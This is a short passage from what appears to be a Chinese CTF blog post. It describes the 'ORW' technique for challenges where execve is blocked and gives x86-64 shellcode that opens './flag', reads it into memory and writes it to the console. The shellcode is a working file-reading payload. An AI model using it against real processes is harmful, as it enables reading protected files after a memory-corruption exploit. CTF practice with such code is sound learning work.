https://blog.csdn.net/qq_54218833/article/details/134205383

## 0x01. execve

这个是最为简单的一类题型，不能直接获得 shell，但是可以通过 open、read、write 三个系统调用将 flag 文件首先保存到内存之中再输出到控制台。

```
    mov rax, 0x67616c662f2e
    push rax
    mov rdi, rsp
    xor edx, edx
    xor esi, esi
    push SYS_open
    pop rax
    syscall
    
    push 3
    pop rdi
    push 0xFF   /* read size */
    pop rdx
    mov rsi, rsp
    push SYS_read
    pop rax
    syscall
    
    push 1
    pop rdi
    push 0xFF   /* write size */
    pop rdx
    mov rsi, rsp
    push SYS_write
    pop rax
    syscall

```

